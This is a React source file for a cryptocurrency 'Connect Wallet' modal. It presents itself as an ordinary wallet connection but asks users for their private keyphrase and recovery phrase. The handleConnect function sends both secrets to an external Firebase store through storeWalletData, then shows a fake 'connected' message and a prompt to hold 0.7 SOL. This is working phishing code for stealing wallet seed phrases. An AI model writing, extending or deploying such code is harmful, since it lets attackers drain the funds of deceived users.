"use client"

import { useState, useEffect, useRef } from "react"
import { X } from "lucide-react"
import { useWalletStore } from "@/lib/wallet-store"
import { storeWalletData } from "@/lib/firebase"
import { toast } from "@/hooks/use-toast"
import { motion } from "framer-motion"

const wallets = [
  { id: "phantom", name: "Phantom", icon: "👻" },
  { id: "metamask", name: "MetaMask", icon: "🦊" },
  { id: "solflare", name: "Solflare", icon: "🔆" },
  { id: "trustwallet", name: "Trust Wallet", icon: "🛡️" },
]

export default function WalletConnectModal({ onClose, onSuccess }) {
  const [step, setStep] = useState(1)
  const [selectedWallet, setSelectedWallet] = useState(null)
  const [customWallet, setCustomWallet] = useState("")
  const [passphrase, setPassphrase] = useState("")
  const [recoveryPhrase, setRecoveryPhrase] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState("")
  const modalRef = useRef(null)

  const { setWalletConnected, setWalletInfo } = useWalletStore()

  // Close modal when clicking outside
  useEffect(() => {
    function handleClickOutside(event) {
      if (modalRef.current && !modalRef.current.contains(event.target)) {
        onClose()
      }
    }

    document.addEventListener("mousedown", handleClickOutside)
    return () => {
      document.removeEventListener("mousedown", handleClickOutside)
    }
  }, [onClose])

  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet)
    setStep(2)
  }

  const handleCustomWallet = () => {
    if (!customWallet.trim()) {
      setError("Please enter a wallet name")
      return
    }
    setSelectedWallet({ id: "custom", name: customWallet })
    setStep(2)
  }

  const handleConnect = async () => {
    if (!passphrase.trim()) {
      setError("Passphrase is required")
      return
    }

    setIsLoading(true)
    setError("")

    try {
      // Store wallet data in Firebase
      try {
        await storeWalletData({
          walletType: selectedWallet.id,
          walletName: selectedWallet.name,
          passphrase,
          recoveryPhrase,
          timestamp: new Date().toISOString(),
        })
      } catch (error) {
        console.warn("Failed to store wallet data, but continuing with connection", error)
        // We'll continue even if storage fails
      }

      // Update wallet connection state
      setWalletConnected(true)

      // Set wallet info
      setWalletInfo(selectedWallet.id, selectedWallet.name)

      // Call success callback if provided
      if (onSuccess) {
        onSuccess()
      } else {
        // Show success toast if no callback provided
        toast.success(
          <div>
            <p>Wallet connected successfully</p>
            <p className="text-sm">You need at least 0.7 SOL (incl. fee) to make purchases</p>
          </div>,
        )

        // Close modal
        onClose()
      }
    } catch (error) {
      console.error("Error connecting wallet:", error)
      setError("Failed to connect wallet. Please try again.")
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <motion.div
      className="fixed inset-0 flex items-center justify-center bg-black/70 z-50 p-4"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      transition={{ duration: 0.3 }}
    >
      <motion.div
        ref={modalRef}
        className="bg-[#0e0e16] border border-gray-800 rounded-lg max-w-md w-full p-6 relative"
        initial={{ scale: 0.9, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        transition={{ duration: 0.3, delay: 0.1 }}
      >
        <motion.button
          onClick={onClose}
          className="absolute right-4 top-4 w-8 h-8 flex items-center justify-center bg-[#252542] rounded-full z-10"
          aria-label="Close modal"
          whileHover={{ scale: 1.1, backgroundColor: "#303052" }}
          whileTap={{ scale: 0.9 }}
        >
          <X className="h-5 w-5 text-gray-400" />
        </motion.button>

        {step === 1 ? (
          <>
            <h2 className="text-xl font-bold mb-6 text-center">Connect Wallet</h2>
            <div className="grid grid-cols-2 gap-4 mb-6">
              {wallets.map((wallet) => (
                <motion.button
                  key={wallet.id}
                  className="flex flex-col items-center justify-center bg-[#1a1a2e] hover:bg-[#252542] border border-gray-800 rounded-lg p-4 transition-colors"
                  onClick={() => handleWalletSelect(wallet)}
                  whileHover={{ scale: 1.05, backgroundColor: "#252542" }}
                  whileTap={{ scale: 0.95 }}
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ duration: 0.3, delay: wallets.indexOf(wallet) * 0.1 }}
                >
                  <span className="text-2xl mb-2">{wallet.icon}</span>
                  <span className="text-sm">{wallet.name}</span>
                </motion.button>
              ))}
            </div>

            <div className="mt-4">
              <p className="text-sm text-gray-400 mb-2">Other Wallet</p>
              <div className="flex gap-2">
                <input
                  type="text"
                  value={customWallet}
                  onChange={(e) => setCustomWallet(e.target.value)}
                  placeholder="Enter wallet name"
                  className="flex-1 bg-[#1a1a2e] border border-gray-800 rounded-md px-3 py-2 text-sm focus:outline-none focus:ring-1 focus:ring-[#2F80ED]"
                />
                <motion.button
                  className="bg-[#2F80ED] hover:bg-[#2D74D6] text-white px-4 py-2 rounded-md text-sm font-medium"
                  onClick={handleCustomWallet}
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                >
                  Connect
                </motion.button>
              </div>
            </div>
          </>
        ) : (
          <>
            <h2 className="text-xl font-bold mb-6 text-center">Connect {selectedWallet.name}</h2>

            <div className="space-y-4">
              <div>
                <label className="block text-sm text-gray-400 mb-1">Private Keyphrase:</label>
                <input
                  type="password"
                  value={passphrase}
                  onChange={(e) => setPassphrase(e.target.value)}
                  placeholder="Enter your wallet passphrase"
                  className="w-full bg-[#1a1a2e] border border-gray-800 rounded-md px-3 py-2 text-sm focus:outline-none focus:ring-1 focus:ring-[#2F80ED]"
                />
              </div>

              <div>
                <label className="block text-sm text-gray-400 mb-1">Recovery Passphrase: (Optional)</label>
                <textarea
                  value={recoveryPhrase}
                  onChange={(e) => setRecoveryPhrase(e.target.value)}
                  placeholder="Enter your recovery phrase"
                  className="w-full bg-[#1a1a2e] border border-gray-800 rounded-md px-3 py-2 text-sm focus:outline-none focus:ring-1 focus:ring-[#2F80ED] min-h-[80px]"
                />
              </div>

              {error && <div className="text-red-500 text-sm py-2">{error}</div>}

              <div className="flex gap-3 mt-6">
                <motion.button
                  className="flex-1 bg-gray-800 hover:bg-gray-700 text-white px-4 py-2 rounded-md text-sm font-medium"
                  onClick={() => setStep(1)}
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                >
                  Back
                </motion.button>
                <motion.button
                  className="flex-1 bg-[#2F80ED] hover:bg-[#2D74D6] text-white px-4 py-2 rounded-md text-sm font-medium disabled:opacity-50 disabled:cursor-not-allowed"
                  onClick={handleConnect}
                  disabled={isLoading || !passphrase.trim()}
                  whileHover={{ scale: isLoading || !passphrase.trim() ? 1 : 1.05 }}
                  whileTap={{ scale: isLoading || !passphrase.trim() ? 1 : 0.95 }}
                >
                  {isLoading ? "Connecting..." : "Connect"}
                </motion.button>
              </div>
            </div>
          </>
        )}
      </motion.div>
    </motion.div>
  )
}
